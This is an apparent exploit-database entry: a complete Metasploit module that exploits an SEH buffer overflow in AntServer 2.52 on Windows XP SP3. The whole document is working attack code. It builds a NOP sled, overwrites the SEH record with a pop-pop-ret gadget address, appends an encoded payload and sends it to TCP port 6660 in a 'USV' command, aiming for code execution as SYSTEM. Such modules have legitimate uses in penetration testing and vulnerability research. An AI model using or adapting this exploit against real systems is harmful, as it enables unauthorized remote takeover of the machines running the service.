# Exploit Title: AntServer 2.52 - SEH Buffer Overflow [Metasploit]
# Date: 10/10/2017
# Exploit Author: GiulioComi
# Version: 2.52
# Tested on: Windows XP SP3 Eng
# CVE : N/A

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

      include Msf::Exploit::Remote::Tcp
      include Msf::Exploit::Remote::Seh


      def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'AntServer 2.52 - SEH Remote Buffer Overflow',
                        'Description'    => %q{
                                        This module exploits buffer overflow in AntServer 2.52.
                                        RPORT of AntServer is by default 6660.
                                        The service runs as SYSTEM.
                                             },
                        'Author'         => [ 'GiulioComi' ],
                        'Version'        => '$Revision: 1 $',
                        'License' => GPL_LICENSE,
 
                        'DefaultOptions' =>
                                {
                                        'EXITFUNC' => 'process',
                                },
                        'Payload'        =>
                                {
                                        'Space'    => 500, # There is little room for a msvenom's generated payload
                                        'BadChars' => "\x00\x0a\x0d\x20\x25",
                                },
                        'Platform'       => 'win',

                        'Targets'        =>
                          [
                                [
                                        'Windows XP SP3 Eng',
                                        { 'Ret' => 0x1b8250a9, 'Offset' => 962 } 
            # 0x1b8250a9 : pop esi # pop edi # ret | ASLR: False, Rebase: False, SafeSEH: False, OS: True (C:\WINDOWS\system32\msjtes40.dll)
                                 ],
                            ],
                        'DefaultTarget' => 0
                        ))

                        register_options(
                        [
                                Opt::RPORT(6660)
                        ], self.class)
       end

       def exploit

          print_status('Connecting to AntServer...')
          connect

          buffer = ""
          buffer << make_nops(target['Offset'])
          #generate_seh_payload takes care of adding short jump at the nextseh address
          buffer << generate_seh_record(target.ret)
          buffer << payload.encoded
          buffer << make_nops(1800) #some nops never hurt
          print_status('Sending payload...')

          sock.put("USV " + buffer + "\r\n\r\n")
          handler
          disconnect
       end

end
